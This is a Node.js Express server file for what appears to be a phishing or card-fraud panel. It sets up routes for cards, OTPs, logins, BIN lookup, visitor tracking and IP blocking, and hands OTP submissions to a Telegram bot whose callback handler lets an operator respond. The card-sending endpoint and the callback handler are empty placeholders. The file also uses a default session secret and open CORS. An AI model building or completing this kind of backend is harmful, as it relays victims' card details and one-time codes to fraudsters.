const express = require("express");
const cors = require("cors");
const session = require("express-session");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const axios = require("axios");
require("dotenv").config();

// Import bot manager
const { initBot, startPolling, stopPolling } = require("./botManager");
const bot = initBot();
const chatId = bot.chatId;

const BlockedIP = require("./models/BlockedIP");
const Card = require("./models/Card");
const OTP = require("./models/OTP");
const Code = require("./models/Code");

// --- Database Connection ---
const mongoURI = process.env.MONGO_URI || "mongodb://localhost:27017/verificationdb";
mongoose
  .connect(mongoURI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB connection error:", err));

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(express.json());
app.use(
  cors({
    origin: process.env.FRONTEND_URL || "*", // Allow your frontend
    credentials: true,
  })
);
app.use(bodyParser.json());
app.use(
  session({
    secret: process.env.SESSION_SECRET || "yourSecretKey",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === "production" },
  })
);

// --- Routes ---
app.use("/api/visitors", require("./routes/visitors"));
app.use("/api/blocked", require("./routes/blocked"));
app.use("/api/settings", require("./routes/settings"));
app.use("/admin/blocked", require("./routes/adminBlocked"));
app.use("/api/track", require("./routes/track"));
app.use("/api/analytics", require("./routes/analytics"));
app.use("/api", require("./routes/captcha"));
app.use("/api", require("./routes/codeRoutes"));
app.use("/api", require("./routes/cardRoutes"));
app.use("/api", require("./routes/loginRoutes"));
app.use("/api/bin-lookup", require("./routes/binLookup"));

// OTP Routes Setup (Passes the bot instance correctly)
const otpRoutesModule = require("./routes/otpRoutes");
otpRoutesModule.setBotInstance(bot, chatId);
app.use("/api", otpRoutesModule.router);

// Test route
app.get("/", (req, res) => {
  res.send("🎯 API is working perfectly. Bot is online.");
});

// (The rest of your API endpoints like /api/send-card, /api/notify, etc. remain EXACTLY the same as your original code)
app.post("/api/send-card", async (req, res) => {
  // ... PASTE YOUR ORIGINAL CODE FOR THIS ENDPOINT HERE ...
});

// ============= SINGLE TELEGRAM CALLBACK HANDLER =============
bot.on("callback_query", async (callbackQuery) => {
  // ... PASTE YOUR ORIGINAL CALLBACK QUERY CODE HERE ...
});

// --- Server Startup ---
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || "development"}`);
  
  // Start polling exactly once
  startPolling();
});

// ✅ Cleanup on exit
process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down gracefully...');
  stopPolling();
  mongoose.connection.close(() => process.exit(0));
});

process.on('SIGTERM', () => {
  console.log('\n🛑 Shutting down gracefully...');
  stopPolling();
  mongoose.connection.close(() => process.exit(0));
});